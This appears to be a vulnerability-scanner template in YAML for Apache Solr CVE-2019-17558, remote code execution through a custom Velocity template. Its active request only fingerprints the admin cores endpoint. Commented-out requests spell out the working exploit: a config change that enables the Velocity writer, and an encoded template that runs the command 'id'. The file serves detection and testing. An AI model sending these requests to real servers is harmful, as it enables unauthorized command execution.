id: apache-solr-rce-cve-2019-17558.yaml
info:
  name: Apache Solr Remote Code Execution Via Velocity Custom Template (CVE-2019-17558)
  risk: Critical

requests:
  - method: POST
    redirect: false
    url: >-
      {{.root}}/solr/admin/cores?indexInfo=false&wt=json
    headers:
      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
    detections:
      - >-
        StatusCode() == 200 && StringSearch("body", "QTime") && StringSearch("body", "instanceDir") && StringSearch("resHeaders", "application/json")

  # # Trigger Command
  # - method: POST
  #   redirect: false
  #   url: >-
  #     {{.root}}/solr/demo/config
  #   headers:
  #     - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
  #     - Content-Type: application/json
  #   body: |
  #     {
  #       "update-queryresponsewriter": {
  #         "startup": "lazy",
  #         "name": "velocity",
  #         "class": "solr.VelocityResponseWriter",
  #         "template.base.dir": "",
  #         "solr.resource.loader.enabled": "true",
  #         "params.resource.loader.enabled": "true"
  #       }
  #     }

  # - method: GET
  #   url: >-
  #    {{.BaseURL}}/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
  #   headers:
  #     - Content-Type: application/json
  #   detections:
  #     - >-
  #       StatusCode() == 200 && StringSearch("body", "uid=") && StringSearch("body", "gid=")
